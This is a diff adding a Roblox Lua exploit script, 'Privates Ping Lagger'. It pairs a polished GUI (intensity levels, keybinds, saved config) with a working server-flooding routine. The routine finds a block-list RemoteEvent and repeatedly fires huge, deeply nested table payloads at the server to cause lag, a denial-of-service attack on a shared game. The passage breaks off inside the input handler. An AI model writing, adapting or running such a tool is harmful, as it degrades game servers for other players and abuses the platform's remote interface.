@@ -1,0 +1,788 @@
+-- Privates Ping Lagger
+-- PC + Controller keybind | Level System | Auto-save
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService     = game:GetService("TweenService")
+local HttpService      = game:GetService("HttpService")
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService")
+
+local plr              = Players.LocalPlayer
+local plrGui           = plr:WaitForChild("PlayerGui")
+
+-- ══════════════════════════════════════════════════════════════════════
+-- CONFIG & SAVE
+-- ══════════════════════════════════════════════════════════════════════
+local CONFIG_FILE = "PrivatesPingLagger_Config.json"
+
+local LEVELS = {
+    low      = { delay = 0.13, name = "Low" },
+    mid      = { delay = 0.11, name = "Mid" },
+    high     = { delay = 0.09, name = "High" },
+    ultra    = { delay = 0.07, name = "Ultra" },
+    extreme  = { delay = 0.06, name = "Extreme" },
+    overload = { delay = 0.05, name = "Overload" },
+    nuclear  = { delay = 0.04, name = "Nuclear" },
+    chaos    = { delay = 0.03, name = "Chaos" },
+    void     = { delay = 0.02, name = "Void" },
+    oblivion = { delay = 0.01, name = "Oblivion" },
+}
+
+local DEFAULT_CFG = {
+    keybindKb     = "F",
+    keybindGp     = "ButtonR2",
+    currentLevel  = "mid",
+}
+
+local LAG_SETTINGS = {
+    power        = 100000,
+    nestingDepth = 150,
+    maxReps      = 50000,
+}
+
+local cfg = {}
+for k, v in pairs(DEFAULT_CFG) do
+    cfg[k] = v
+end
+
+local function resolveKb(name)
+    if not name or name == "" or name == "None" then return nil end
+    local ok, val = pcall(function() return Enum.KeyCode[name] end)
+    return (ok and val) or nil
+end
+
+local function saveConfig()
+    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+    if ok and encoded and writefile then
+        pcall(writefile, CONFIG_FILE, encoded)
+    end
+end
+
+local function loadConfig()
+    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+    if not ok or type(data) ~= "table" then return end
+
+    cfg.keybindKb    = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
+    cfg.keybindGp    = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
+    cfg.currentLevel = type(data.currentLevel) == "string" and LEVELS[data.currentLevel] and data.currentLevel or DEFAULT_CFG.currentLevel
+end
+
+loadConfig()
+
+local active        = false
+local listeningFor  = nil
+local remote        = nil
+
+-- ══════════════════════════════════════════════════════════════════════
+-- COLOURS - Ultra Premium
+-- ══════════════════════════════════════════════════════════════════════
+local C = {
+    bg        = Color3.fromRGB(6, 6, 10),
+    surface   = Color3.fromRGB(14, 14, 22),
+    card      = Color3.fromRGB(20, 20, 30),
+    border    = Color3.fromRGB(32, 32, 48),
+    accent    = Color3.fromRGB(99, 102, 241),
+    accent2   = Color3.fromRGB(139, 142, 255),
+    white     = Color3.fromRGB(240, 240, 252),
+    dim       = Color3.fromRGB(115, 115, 140),
+    green     = Color3.fromRGB(52, 211, 153),
+    red       = Color3.fromRGB(248, 113, 113),
+    orange    = Color3.fromRGB(251, 146, 60),
+    yellow    = Color3.fromRGB(250, 204, 21),
+    purple    = Color3.fromRGB(167, 139, 250),
+    pink      = Color3.fromRGB(244, 114, 182),
+    cyan      = Color3.fromRGB(34, 211, 238),
+    lime      = Color3.fromRGB(163, 230, 53),
+    amber     = Color3.fromRGB(245, 158, 11),
+    rose      = Color3.fromRGB(251, 113, 133),
+    waiting   = Color3.fromRGB(251, 191, 36),
+    inputBg   = Color3.fromRGB(10, 10, 18),
+    selected  = Color3.fromRGB(30, 30, 46),
+    hover     = Color3.fromRGB(40, 40, 58),
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- DESTROY OLD GUI
+-- ══════════════════════════════════════════════════════════════════════
+for _, kid in pairs(plrGui:GetChildren()) do
+    if kid.Name == "PrivatesPingLaggerGui" then kid:Destroy() end
+end
+
+local screen = Instance.new("ScreenGui")
+screen.Name         = "PrivatesPingLaggerGui"
+screen.ResetOnSpawn = false
+screen.DisplayOrder = 15
+screen.Parent       = plrGui
+
+-- ══════════════════════════════════════════════════════════════════════
+-- HELPERS
+-- ══════════════════════════════════════════════════════════════════════
+local function tw(obj, props, t, easing)
+    TweenService:Create(obj,
+        TweenInfo.new(t or 0.2, easing or Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+        props):Play()
+end
+
+local function addGradient(obj, c1, c2, rot)
+    local g = Instance.new("UIGradient", obj)
+    g.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, c1),
+        ColorSequenceKeypoint.new(1, c2)
+    })
+    g.Rotation = rot or 135
+    return g
+end
+
+local function makeDraggable(frame)
+    local dragToggle, dragStart, startPos
+    
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragToggle = true
+            dragStart = input.Position
+            startPos = frame.Position
+        end
+    end)
+    
+    frame.InputChanged:Connect(function(input)
+        if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragToggle = false
+        end
+    end)
+end
+
+local function isGamepad(kc)
+    local n = kc.Name
+    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
+        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
+end
+
+local BLACKLISTED = {
+    [Enum.KeyCode.Escape]      = true,
+    [Enum.KeyCode.LeftControl] = true,
+    [Enum.KeyCode.Unknown]     = true,
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- MAIN FRAME
+-- ══════════════════════════════════════════════════════════════════════
+local MAIN_W, MAIN_H = 320, 300
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name             = "MainFrame"
+mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
+mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
+mainFrame.BackgroundColor3 = C.bg
+mainFrame.BackgroundTransparency = 0.08
+mainFrame.BorderSizePixel  = 0
+mainFrame.Active           = true
+mainFrame.ClipsDescendants = false
+mainFrame.Parent           = screen
+
+local mainCorner = Instance.new("UICorner", mainFrame)
+mainCorner.CornerRadius = UDim.new(0, 18)
+
+-- Double border effect
+local outerGlow = Instance.new("UIStroke", mainFrame)
+outerGlow.Color        = C.border
+outerGlow.Thickness    = 2
+outerGlow.Transparency = 0.4
+outerGlow.LineJoinMode = Enum.LineJoinMode.Round
+
+local innerGlow = Instance.new("Frame", mainFrame)
+innerGlow.Size             = UDim2.new(1, -4, 1, -4)
+innerGlow.Position         = UDim2.new(0, 2, 0, 2)
+innerGlow.BackgroundColor3 = Color3.fromRGB(0,0,0)
+innerGlow.BackgroundTransparency = 1
+innerGlow.BorderSizePixel  = 0
+innerGlow.ZIndex           = 5
+Instance.new("UICorner", innerGlow).CornerRadius = UDim.new(0, 16)
+
+local innerStroke = Instance.new("UIStroke", innerGlow)
+innerStroke.Color        = C.accent
+innerStroke.Thickness    = 1
+innerStroke.Transparency = 0.6
+innerStroke.LineJoinMode = Enum.LineJoinMode.Round
+
+addGradient(mainFrame, Color3.fromRGB(10,10,18), Color3.fromRGB(5,5,10), 160)
+makeDraggable(mainFrame)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- HEADER
+-- ══════════════════════════════════════════════════════════════════════
+local header = Instance.new("Frame", mainFrame)
+header.Size             = UDim2.new(1, 0, 0, 44)
+header.BackgroundColor3 = C.surface
+header.BackgroundTransparency = 0.2
+header.BorderSizePixel  = 0
+header.ZIndex           = 2
+Instance.new("UICorner", header).CornerRadius = UDim.new(0, 18)
+
+local headerFill = Instance.new("Frame", mainFrame)
+headerFill.Size             = UDim2.new(1, 0, 0, 18)
+headerFill.Position         = UDim2.new(0, 0, 0, 26)
+headerFill.BackgroundColor3 = C.surface
+headerFill.BackgroundTransparency = 0.2
+headerFill.BorderSizePixel  = 0
+headerFill.ZIndex           = 1
+
+-- Accent bar
+local accentBar = Instance.new("Frame", header)
+accentBar.Size             = UDim2.new(0, 60, 0, 2)
+accentBar.Position         = UDim2.new(0, 16, 1, -2)
+accentBar.BackgroundColor3 = C.accent
+accentBar.BorderSizePixel  = 0
+accentBar.ZIndex           = 3
+Instance.new("UICorner", accentBar).CornerRadius = UDim.new(1, 0)
+addGradient(accentBar, C.accent, C.accent2, 90)
+
+-- Logo
+local logoFrame = Instance.new("Frame", header)
+logoFrame.Size             = UDim2.new(0, 28, 0, 28)
+logoFrame.Position         = UDim2.new(0, 12, 0.5, -14)
+logoFrame.BackgroundColor3 = C.accent
+logoFrame.BorderSizePixel  = 0
+logoFrame.ZIndex           = 3
+Instance.new("UICorner", logoFrame).CornerRadius = UDim.new(0, 8)
+addGradient(logoFrame, C.accent, Color3.fromRGB(67, 56, 202), 45)
+
+local logoLetter = Instance.new("TextLabel", logoFrame)
+logoLetter.Size               = UDim2.new(1, 0, 1, 0)
+logoLetter.BackgroundTransparency = 1
+logoLetter.Text               = "P"
+logoLetter.TextColor3         = C.white
+logoLetter.Font               = Enum.Font.GothamBlack
+logoLetter.TextSize           = 15
+logoLetter.ZIndex             = 4
+
+local titleLbl = Instance.new("TextLabel", header)
+titleLbl.Size               = UDim2.new(1, -100, 1, 0)
+titleLbl.Position           = UDim2.new(0, 46, 0, 0)
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text               = "PRIVATES PING LAGGER"
+titleLbl.TextColor3         = C.white
+titleLbl.Font               = Enum.Font.GothamBlack
+titleLbl.TextSize           = 11
+titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
+titleLbl.ZIndex             = 3
+
+-- Status pill
+local statusPill = Instance.new("Frame", header)
+statusPill.Size             = UDim2.new(0, 52, 0, 24)
+statusPill.Position         = UDim2.new(1, -58, 0.5, -12)
+statusPill.BackgroundColor3 = Color3.fromRGB(40, 15, 15)
+statusPill.BackgroundTransparency = 0.25
+statusPill.BorderSizePixel  = 0
+statusPill.ZIndex           = 3
+Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
+
+local pillBorder = Instance.new("UIStroke", statusPill)
+pillBorder.Color        = C.red
+pillBorder.Thickness    = 1
+pillBorder.Transparency = 0.3
+pillBorder.LineJoinMode = Enum.LineJoinMode.Round
+
+local statusDot = Instance.new("Frame", statusPill)
+statusDot.Size             = UDim2.new(0, 7, 0, 7)
+statusDot.Position         = UDim2.new(0, 10, 0.5, -3.5)
+statusDot.BackgroundColor3 = C.red
+statusDot.BorderSizePixel  = 0
+statusDot.ZIndex           = 4
+Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
+
+local statusLbl = Instance.new("TextLabel", statusPill)
+statusLbl.Size               = UDim2.new(0, 28, 1, 0)
+statusLbl.Position           = UDim2.new(0, 20, 0, 0)
+statusLbl.BackgroundTransparency = 1
+statusLbl.Text               = "OFF"
+statusLbl.TextColor3         = C.red
+statusLbl.Font               = Enum.Font.GothamBlack
+statusLbl.TextSize           = 9
+statusLbl.ZIndex             = 4
+
+-- ══════════════════════════════════════════════════════════════════════
+-- LEVEL SECTION
+-- ══════════════════════════════════════════════════════════════════════
+local levelSection = Instance.new("Frame", mainFrame)
+levelSection.Size             = UDim2.new(1, -20, 0, 108)
+levelSection.Position         = UDim2.new(0, 10, 0, 50)
+levelSection.BackgroundColor3 = C.surface
+levelSection.BackgroundTransparency = 0.25
+levelSection.BorderSizePixel  = 0
+levelSection.ZIndex           = 2
+Instance.new("UICorner", levelSection).CornerRadius = UDim.new(0, 14)
+
+local levelBorder = Instance.new("UIStroke", levelSection)
+levelBorder.Color        = C.border
+levelBorder.Thickness    = 1
+levelBorder.Transparency = 0.3
+levelBorder.LineJoinMode = Enum.LineJoinMode.Round
+
+local levelLabel = Instance.new("TextLabel", levelSection)
+levelLabel.Size               = UDim2.new(1, 0, 0, 18)
+levelLabel.Position           = UDim2.new(0, 0, 0, 10)
+levelLabel.BackgroundTransparency = 1
+levelLabel.Text               = "INTENSITY LEVEL — " .. LEVELS[cfg.currentLevel].name
+levelLabel.TextColor3         = C.dim
+levelLabel.Font               = Enum.Font.GothamBlack
+levelLabel.TextSize           = 8
+levelLabel.TextXAlignment     = Enum.TextXAlignment.Center
+levelLabel.ZIndex             = 3
+
+local levelBtns = {}
+local levelOrder = {"low", "mid", "high", "ultra", "extreme", "overload", "nuclear", "chaos", "void", "oblivion"}
+local levelColors = {
+    low      = C.green,
+    mid      = C.lime,
+    high     = C.yellow,
+    ultra    = C.amber,
+    extreme  = C.orange,
+    overload = C.red,
+    nuclear  = C.rose,
+    chaos    = C.pink,
+    void     = C.purple,
+    oblivion = C.cyan,
+}
+
+local function updateLevelDisplay()
+    for lvl, btn in pairs(levelBtns) do
+        local col = levelColors[lvl]
+        if lvl == cfg.currentLevel then
+            tw(btn.bg, {BackgroundColor3 = col, BackgroundTransparency = 0.8}, 0.25, Enum.EasingStyle.Quart)
+            tw(btn.border, {Color = col, Transparency = 0}, 0.25, Enum.EasingStyle.Quart)
+            tw(btn.label, {TextColor3 = col}, 0.25, Enum.EasingStyle.Quart)
+            btn.label.Font = Enum.Font.GothamBlack
+        else
+            tw(btn.bg, {BackgroundColor3 = C.card, BackgroundTransparency = 0.4}, 0.25, Enum.EasingStyle.Quart)
+            tw(btn.border, {Color = C.border, Transparency = 0.6}, 0.25, Enum.EasingStyle.Quart)
+            tw(btn.label, {TextColor3 = C.dim}, 0.25, Enum.EasingStyle.Quart)
+            btn.label.Font = Enum.Font.GothamBold
+        end
+    end
+    levelLabel.Text = "INTENSITY LEVEL — " .. LEVELS[cfg.currentLevel].name
+end
+
+for i, lvl in ipairs(levelOrder) do
+    local btnWidth = 54
+    local btnHeight = 28
+    local spacingX = 6
+    local spacingY = 6
+    local colsPerRow = 5
+    
+    local row = math.floor((i - 1) / colsPerRow)
+    local col = (i - 1) % colsPerRow
+    
+    local totalWidth = (btnWidth * colsPerRow) + (spacingX * (colsPerRow - 1))
+    local startX = (300 - totalWidth) / 2
+    local startY = 32
+    
+    local btnFrame = Instance.new("TextButton", levelSection)
+    btnFrame.Size             = UDim2.new(0, btnWidth, 0, btnHeight)
+    btnFrame.Position         = UDim2.new(0, startX + (col * (btnWidth + spacingX)), 0, startY + (row * (btnHeight + spacingY)))
+    btnFrame.BackgroundColor3 = C.card
+    btnFrame.BackgroundTransparency = 0.4
+    btnFrame.BorderSizePixel  = 0
+    btnFrame.AutoButtonColor  = false
+    btnFrame.Text             = ""
+    btnFrame.ZIndex           = 3
+    Instance.new("UICorner", btnFrame).CornerRadius = UDim.new(1, 0)
+    
+    local btnBorder = Instance.new("UIStroke", btnFrame)
+    btnBorder.Color        = C.border
+    btnBorder.Thickness    = 1
+    btnBorder.Transparency = 0.6
+    btnBorder.LineJoinMode = Enum.LineJoinMode.Round
+    
+    local btnLabel = Instance.new("TextLabel", btnFrame)
+    btnLabel.Size               = UDim2.new(1, 0, 1, 0)
+    btnLabel.BackgroundTransparency = 1
+    btnLabel.Text               = LEVELS[lvl].name
+    btnLabel.TextColor3         = C.dim
+    btnLabel.Font               = Enum.Font.GothamBold
+    btnLabel.TextSize           = 9
+    btnLabel.ZIndex             = 4
+    
+    local btnData = { bg = btnFrame, border = btnBorder, label = btnLabel }
+    
+    btnFrame.MouseEnter:Connect(function()
+        if lvl ~= cfg.currentLevel then
+            tw(btnFrame, {BackgroundColor3 = C.hover, BackgroundTransparency = 0.2}, 0.15)
+            tw(btnBorder, {Transparency = 0.2}, 0.15)
+            tw(btnLabel, {TextColor3 = C.white}, 0.15)
+        end
+    end)
+    btnFrame.MouseLeave:Connect(function()
+        if lvl ~= cfg.currentLevel then
+            tw(btnFrame, {BackgroundColor3 = C.card, BackgroundTransparency = 0.4}, 0.15)
+            tw(btnBorder, {Transparency = 0.6}, 0.15)
+            tw(btnLabel, {TextColor3 = C.dim}, 0.15)
+        end
+    end)
+    
+    btnFrame.MouseButton1Click:Connect(function()
+        if cfg.currentLevel ~= lvl then
+            cfg.currentLevel = lvl
+            updateLevelDisplay()
+            saveConfig()
+        end
+    end)
+    
+    levelBtns[lvl] = btnData
+end
+
+-- ══════════════════════════════════════════════════════════════════════
+-- KEYBIND SECTION
+-- ══════════════════════════════════════════════════════════════════════
+local keybindSection = Instance.new("Frame", mainFrame)
+keybindSection.Size             = UDim2.new(1, -20, 0, 72)
+keybindSection.Position         = UDim2.new(0, 10, 0, 164)
+keybindSection.BackgroundColor3 = C.surface
+keybindSection.BackgroundTransparency = 0.25
+keybindSection.BorderSizePixel  = 0
+keybindSection.ZIndex           = 2
+Instance.new("UICorner", keybindSection).CornerRadius = UDim.new(0, 14)
+
+local keybindBorder = Instance.new("UIStroke", keybindSection)
+keybindBorder.Color        = C.border
+keybindBorder.Thickness    = 1
+keybindBorder.Transparency = 0.3
+keybindBorder.LineJoinMode = Enum.LineJoinMode.Round
+
+local keybindTitle = Instance.new("TextLabel", keybindSection)
+keybindTitle.Size               = UDim2.new(1, 0, 0, 16)
+keybindTitle.Position           = UDim2.new(0, 0, 0, 8)
+keybindTitle.BackgroundTransparency = 1
+keybindTitle.Text               = "KEYBINDS"
+keybindTitle.TextColor3         = C.dim
+keybindTitle.Font               = Enum.Font.GothamBlack
+keybindTitle.TextSize           = 8
+keybindTitle.TextXAlignment     = Enum.TextXAlignment.Center
+keybindTitle.ZIndex             = 3
+
+local kbBindBtn, gpBindBtn
+
+local function updateKbLabels()
+    if kbBindBtn then
+        if listeningFor == "kb" then
+            kbBindBtn.label.Text = "..."
+            tw(kbBindBtn.bg, {BackgroundColor3 = Color3.fromRGB(60, 45, 15)}, 0.2)
+            tw(kbBindBtn.border, {Color = C.waiting, Transparency = 0}, 0.2)
+            tw(kbBindBtn.dot, {BackgroundColor3 = C.waiting}, 0.2)
+        else
+            kbBindBtn.label.Text = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
+            tw(kbBindBtn.bg, {BackgroundColor3 = C.inputBg}, 0.2)
+            tw(kbBindBtn.border, {Color = C.border, Transparency = 0.5}, 0.2)
+            tw(kbBindBtn.dot, {BackgroundColor3 = C.dim}, 0.2)
+        end
+    end
+    if gpBindBtn then
+        if listeningFor == "gp" then
+            gpBindBtn.label.Text = "..."
+            tw(gpBindBtn.bg, {BackgroundColor3 = Color3.fromRGB(60, 45, 15)}, 0.2)
+            tw(gpBindBtn.border, {Color = C.waiting, Transparency = 0}, 0.2)
+            tw(gpBindBtn.dot, {BackgroundColor3 = C.waiting}, 0.2)
+        else
+            gpBindBtn.label.Text = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
+            tw(gpBindBtn.bg, {BackgroundColor3 = C.inputBg}, 0.2)
+            tw(gpBindBtn.border, {Color = C.border, Transparency = 0.5}, 0.2)
+            tw(gpBindBtn.dot, {BackgroundColor3 = C.dim}, 0.2)
+        end
+    end
+end
+
+local function mkKeybindRow(yPos, labelText, which)
+    local dot = Instance.new("Frame", keybindSection)
+    dot.Size             = UDim2.new(0, 6, 0, 6)
+    dot.Position         = UDim2.new(0, 16, 0, yPos + 8)
+    dot.BackgroundColor3 = C.dim
+    dot.BorderSizePixel  = 0
+    dot.ZIndex           = 3
+    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
+
+    local lbl = Instance.new("TextLabel", keybindSection)
+    lbl.Size               = UDim2.new(0, 70, 0, 22)
+    lbl.Position           = UDim2.new(0, 30, 0, yPos)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = labelText
+    lbl.TextColor3         = C.dim
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 10
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 3
+
+    local bindBtn = Instance.new("TextButton", keybindSection)
+    bindBtn.Size             = UDim2.new(0, 100, 0, 24)
+    bindBtn.Position         = UDim2.new(1, -130, 0, yPos - 1)
+    bindBtn.BackgroundColor3 = C.inputBg
+    bindBtn.BackgroundTransparency = 0.2
+    bindBtn.BorderSizePixel  = 0
+    bindBtn.AutoButtonColor  = false
+    bindBtn.Text             = ""
+    bindBtn.ZIndex           = 3
+    Instance.new("UICorner", bindBtn).CornerRadius = UDim.new(0, 6)
+    
+    local bindBorder = Instance.new("UIStroke", bindBtn)
+    bindBorder.Color        = C.border
+    bindBorder.Thickness    = 1
+    bindBorder.Transparency = 0.5
+    bindBorder.LineJoinMode = Enum.LineJoinMode.Round
+    
+    local bindText = Instance.new("TextLabel", bindBtn)
+    bindText.Size               = UDim2.new(1, 0, 1, 0)
+    bindText.BackgroundTransparency = 1
+    bindText.Text               = which == "kb" and cfg.keybindKb or cfg.keybindGp
+    bindText.TextColor3         = C.white
+    bindText.Font               = Enum.Font.GothamBold
+    bindText.TextSize           = 11
+    bindText.ZIndex             = 4
+    
+    local bindData = { bg = bindBtn, border = bindBorder, label = bindText, dot = dot }
+    
+    bindBtn.MouseEnter:Connect(function()
+        if listeningFor ~= which then
+            tw(bindBtn, {BackgroundColor3 = C.hover, BackgroundTransparency = 0.1}, 0.15)
+            tw(bindBorder, {Transparency = 0.2}, 0.15)
+        end
+    end)
+    bindBtn.MouseLeave:Connect(function()
+        if listeningFor ~= which then
+            tw(bindBtn, {BackgroundColor3 = C.inputBg, BackgroundTransparency = 0.2}, 0.15)
+            tw(bindBorder, {Transparency = 0.5}, 0.15)
+        end
+    end)
+    bindBtn.MouseButton1Click:Connect(function()
+        listeningFor = (listeningFor == which) and nil or which
+        updateKbLabels()
+    end)
+
+    local clearBtn = Instance.new("TextButton", keybindSection)
+    clearBtn.Size             = UDim2.new(0, 24, 0, 24)
+    clearBtn.Position         = UDim2.new(1, -26, 0, yPos - 1)
+    clearBtn.BackgroundColor3 = Color3.fromRGB(45, 18, 18)
+    clearBtn.BackgroundTransparency = 0.25
+    clearBtn.BorderSizePixel  = 0
+    clearBtn.AutoButtonColor  = false
+    clearBtn.Text             = ""
+    clearBtn.ZIndex           = 3
+    Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 6)
+    
+    local clearBorder = Instance.new("UIStroke", clearBtn)
+    clearBorder.Color        = C.red
+    clearBorder.Thickness    = 1
+    clearBorder.Transparency = 0.4
+    clearBorder.LineJoinMode = Enum.LineJoinMode.Round
+    
+    local clearText = Instance.new("TextLabel", clearBtn)
+    clearText.Size               = UDim2.new(1, 0, 1, 0)
+    clearText.BackgroundTransparency = 1
+    clearText.Text               = "x"
+    clearText.TextColor3         = C.red
+    clearText.Font               = Enum.Font.GothamBlack
+    clearText.TextSize           = 11
+    clearText.ZIndex             = 4
+    
+    clearBtn.MouseEnter:Connect(function() 
+        tw(clearBtn, {BackgroundColor3 = C.red, BackgroundTransparency = 0.05}, 0.15)
+        tw(clearBorder, {Transparency = 0}, 0.15)
+        tw(clearText, {TextColor3 = C.white}, 0.15)
+    end)
+    clearBtn.MouseLeave:Connect(function() 
+        tw(clearBtn, {BackgroundColor3 = Color3.fromRGB(45, 18, 18), BackgroundTransparency = 0.25}, 0.15)
+        tw(clearBorder, {Transparency = 0.4}, 0.15)
+        tw(clearText, {TextColor3 = C.red}, 0.15)
+    end)
+    clearBtn.MouseButton1Click:Connect(function()
+        if listeningFor == which then listeningFor = nil end
+        if which == "kb" then cfg.keybindKb = "None" else cfg.keybindGp = "None" end
+        updateKbLabels()
+        saveConfig()
+    end)
+
+    if which == "kb" then kbBindBtn = bindData end
+    if which == "gp" then gpBindBtn = bindData end
+end
+
+mkKeybindRow(28, "Keyboard", "kb")
+mkKeybindRow(52, "Controller", "gp")
+
+-- ══════════════════════════════════════════════════════════════════════
+-- ACTIVATE BUTTON
+-- ══════════════════════════════════════════════════════════════════════
+local activateBtnContainer = Instance.new("Frame", mainFrame)
+activateBtnContainer.Size             = UDim2.new(1, -20, 0, 44)
+activateBtnContainer.Position         = UDim2.new(0, 10, 0, 244)
+activateBtnContainer.BackgroundColor3 = Color3.fromRGB(0,0,0)
+activateBtnContainer.BackgroundTransparency = 1
+activateBtnContainer.BorderSizePixel  = 0
+activateBtnContainer.ZIndex           = 2
+
+local activateBtn = Instance.new("TextButton", activateBtnContainer)
+activateBtn.Size             = UDim2.new(1, 0, 0, 40)
+activateBtn.Position         = UDim2.new(0, 0, 0, 0)
+activateBtn.BackgroundColor3 = C.accent
+activateBtn.BorderSizePixel  = 0
+activateBtn.AutoButtonColor  = false
+activateBtn.Text             = ""
+activateBtn.ZIndex           = 3
+Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0, 14)
+
+local activateGrad = addGradient(activateBtn, C.accent, Color3.fromRGB(67, 56, 202), 135)
+
+local activateGlow = Instance.new("UIStroke", activateBtn)
+activateGlow.Color        = C.accent2
+activateGlow.Thickness    = 2
+activateGlow.Transparency = 0.2
+activateGlow.LineJoinMode = Enum.LineJoinMode.Round
+
+local activateShadow = Instance.new("Frame", activateBtnContainer)
+activateShadow.Size             = UDim2.new(1, 0, 0, 40)
+activateShadow.Position         = UDim2.new(0, 0, 0, 4)
+activateShadow.BackgroundColor3 = C.accent
+activateShadow.BackgroundTransparency = 0.85
+activateShadow.BorderSizePixel  = 0
+activateShadow.ZIndex           = 2
+Instance.new("UICorner", activateShadow).CornerRadius = UDim.new(0, 14)
+
+local activateLbl = Instance.new("TextLabel", activateBtn)
+activateLbl.Size            = UDim2.new(1, 0, 1, 0)
+activateLbl.BackgroundTransparency = 1
+activateLbl.Text            = "ACTIVATE"
+activateLbl.TextColor3      = C.white
+activateLbl.Font            = Enum.Font.GothamBlack
+activateLbl.TextSize        = 15
+activateLbl.ZIndex          = 4
+
+-- ══════════════════════════════════════════════════════════════════════
+-- PING LAGGER LOGIC
+-- ══════════════════════════════════════════════════════════════════════
+local function findRemote()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
+        local r = rrs:FindFirstChild(name)
+        if r and r:IsA("RemoteEvent") then return r end
+    end
+    for _, c in ipairs(rrs:GetChildren()) do
+        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
+    end
+end
+
+remote = findRemote()
+
+local function buildPayload()
+    local main = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, LAG_SETTINGS.nestingDepth do
+        local n = {}
+        table.insert(current, n)
+        current = n
+    end
+    local maxRep = math.min(math.floor(LAG_SETTINGS.power / (LAG_SETTINGS.nestingDepth + 2)), LAG_SETTINGS.maxReps)
+    for _ = 1, maxRep do
+        table.insert(main, nested)
+    end
+    return main
+end
+
+local function runPingLoop()
+    while active and remote do
+        local delay = LEVELS[cfg.currentLevel].delay
+        local payload = buildPayload()
+        local ok = pcall(function() remote:FireServer(payload) end)
+        task.wait(delay)
+    end
+end
+
+local function flipLag(state)
+    active = state
+    if active then
+        if not remote then
+            remote = findRemote()
+            if not remote then active = false; flipLag(false); return end
+        end
+        
+        activateGrad:Destroy()
+        addGradient(activateBtn, C.green, Color3.fromRGB(16, 185, 129), 135)
+        activateLbl.Text = "ACTIVATED"
+        tw(activateGlow, {Color = C.green, Transparency = 0.1}, 0.3)
+        tw(activateShadow, {BackgroundColor3 = C.green}, 0.3)
+        tw(outerGlow, {Color = C.green, Transparency = 0.15}, 0.3)
+        tw(innerStroke, {Color = C.green, Transparency = 0.3}, 0.3)
+        
+        tw(statusPill, {BackgroundColor3 = Color3.fromRGB(15, 40, 25)}, 0.3)
+        tw(pillBorder, {Color = C.green, Transparency = 0.2}, 0.3)
+        tw(statusDot, {BackgroundColor3 = C.green}, 0.3)
+        statusLbl.Text = "ON"
+        tw(statusLbl, {TextColor3 = C.green}, 0.3)
+        
+        task.spawn(runPingLoop)
+    else
+        activateGrad:Destroy()
+        addGradient(activateBtn, C.accent, Color3.fromRGB(67, 56, 202), 135)
+        activateLbl.Text = "ACTIVATE"
+        tw(activateGlow, {Color = C.accent2, Transparency = 0.2}, 0.3)
+        tw(activateShadow, {BackgroundColor3 = C.accent}, 0.3)
+        tw(outerGlow, {Color = C.border, Transparency = 0.4}, 0.3)
+        tw(innerStroke, {Color = C.accent, Transparency = 0.6}, 0.3)
+        
+        tw(statusPill, {BackgroundColor3 = Color3.fromRGB(40, 15, 15)}, 0.3)
+        tw(pillBorder, {Color = C.red, Transparency = 0.3}, 0.3)
+        tw(statusDot, {BackgroundColor3 = C.red}, 0.3)
+        statusLbl.Text = "OFF"
+        tw(statusLbl, {TextColor3 = C.red}, 0.3)
+    end
+end
+
+activateBtn.MouseButton1Click:Connect(function() flipLag(not active) end)
+activateBtn.MouseEnter:Connect(function()
+    if not active then
+        tw(activateBtn, {BackgroundColor3 = C.accent2}, 0.2)
+        tw(activateShadow, {BackgroundTransparency = 0.8}, 0.2)
+    end
+end)
+activateBtn.MouseLeave:Connect(function()
+    if not active then
+        tw(activateBtn, {BackgroundColor3 = C.accent}, 0.2)
+        tw(activateShadow, {BackgroundTransparency = 0.85}, 0.2)
+    end
+end)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- INPUT HANDLER
+-- ══════════════════════════════════════════════════════════════════════
+UserInputService.InputBegan:Connect(function(input, processed)
+    local kc = input.KeyCode
+    if kc == Enum.KeyCode.Unknown then return end
+    local isGp = isGamepad(kc)
+    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
+
+    if listeningFor then
